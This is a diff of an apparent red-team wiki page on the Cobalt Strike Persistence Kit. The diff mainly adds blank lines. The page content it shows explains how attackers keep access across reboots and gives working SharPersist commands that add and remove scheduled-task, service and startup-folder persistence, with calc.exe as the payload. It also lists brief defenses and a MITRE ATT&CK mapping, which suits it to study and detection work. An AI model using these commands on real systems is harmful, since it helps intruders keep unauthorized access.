@@ -44,11 +44,15 @@ From a technical perspective, the Persistence Kit leverages various persistence 
 
 The business value of the Cobalt Strike Persistence Kit is that it allows attackers to maintain access to a compromised system, even after a reboot. This can be useful in situations where the attacker wants to maintain a long-term presence on the network, or where the attacker wants to ensure that the payload is executed even if the system is restarted for maintenance or other reasons.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised system
 
 1. Cobalt Strike installed on the attacker's system
+
+ 
 
 ## Defense
 
@@ -58,20 +62,32 @@ The business value of the Cobalt Strike Persistence Kit is that it allows attack
 
 1. Use strong passwords and two-factor authentication to prevent unauthorized access to systems
 
+ 
+
 ## Objectives
 
 1. Establish persistence on a compromised system
 
 1. Maintain access to a system even after a reboot
 
+ 
+
 # Instructions
 
 1. This command is used to list or add persistences on a system. The -t flag specifies the type of persistence to use, such as schtaskbackdoor, startupfolder, service, or schtask. The -m flag specifies the mode of the command, such as list or add. The -c flag specifies the command to execute, and the -a flag specifies the arguments to pass to the command. The -n flag specifies the name of the persistence. The -o flag specifies the frequency of the task, such as hourly or daily.
 
+ 
+
+
+
 **Code**: [[# List persistences
 SharPersist -t schtaskbackdoor]]
 
+
+
 > The SharPersist command can be used to list or add persistences on a system. The -t flag specifies the type of persistence to use, such as schtaskbackdoor, startupfolder, service, or schtask. The -m flag specifies the mode of the command, such as list or add. The -c flag specifies the command to execute, and the -a flag specifies the arguments to pass to the command. The -n flag specifies the name of the persistence. The -o flag specifies the frequency of the task, such as hourly or daily. The command can be used to add a persistence, remove a persistence, or list existing persistences.
+
+
 
 **Command** ([[List persistences using SharPersist]]):
 
@@ -81,11 +97,19 @@ SharPersist -t startupfolder -m list
 SharPersist -t schtask -m list
 ```
 
+
+
+
+
 **Command** ([[Add a new persistence using SharPersist]]):
 
 ```bash
 SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
 ```
+
+
+
+
 
 **Command** ([[Remove a persistence using SharPersist]]):
 
@@ -93,11 +117,19 @@ SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe"
 SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
 ```
 
+
+
+
+
 **Command** ([[Add a new service persistence using SharPersist]]):
 
 ```bash
 SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
 ```
+
+
+
+
 
 **Command** ([[Remove a service persistence using SharPersist]]):
 
@@ -105,11 +137,19 @@ SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t service -n "Some Service" -m remove
 ```
 
+
+
+
+
 **Command** ([[Add a new schtask persistence using SharPersist]]):
 
 ```bash
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
 ```
+
+
+
+
 
 **Command** ([[Add a new hourly schtask persistence using SharPersist]]):
 
@@ -117,11 +157,17 @@ SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
 
+
+
+
+
 **Command** ([[Remove a schtask persistence using SharPersist]]):
 
 ```bash
 SharPersist -t schtask -n "Some Task" -m remove
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -152,3 +198,5 @@ SharPersist -t schtask -n "Some Task" -m remove
 - [[Cobalt Strike]]
 - [[Kits]]
 - [[Persistence Kit]]
+
+
